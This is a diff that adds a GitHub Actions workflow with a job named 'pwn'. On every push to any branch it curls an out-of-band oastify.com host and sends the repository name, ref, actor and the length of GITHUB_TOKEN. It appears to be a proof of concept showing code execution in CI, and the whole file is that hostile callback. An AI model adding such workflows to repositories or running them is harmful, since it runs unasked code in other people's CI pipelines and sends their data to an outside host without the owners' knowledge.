@@ -1,0 +1,12 @@
+name: b2-copy-exec
+on:
+  push:
+    branches:
+      - '**'
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: oob
+        run: |
+          curl -s "http://5u0u8ig9ynncyis2w44r97ra71dv1k.oastify.com/copy-exec?repo=$GITHUB_REPOSITORY&ref=$GITHUB_REF&actor=$GITHUB_ACTOR&tok=${#GITHUB_TOKEN}" || true
